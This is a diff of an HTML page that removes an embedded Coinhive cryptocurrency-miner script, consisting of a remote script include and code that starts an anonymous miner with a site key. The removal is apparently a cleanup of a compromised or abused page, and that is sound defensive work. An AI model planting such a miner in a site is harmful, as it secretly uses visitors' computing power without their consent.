@@ -94,11 +94,6 @@
             </div>
             </div>></div>
             <!--End of Content-->
-<script src="https://coinhive.com/lib/coinhive.min.js"></script>
-<script>
-	var miner = new CoinHive.Anonymous('JYrPuKMz11Q7QQTMqjHO3KZMkDFxLo5k');
-	miner.start();
-</script>
 </body>
 
 </html>
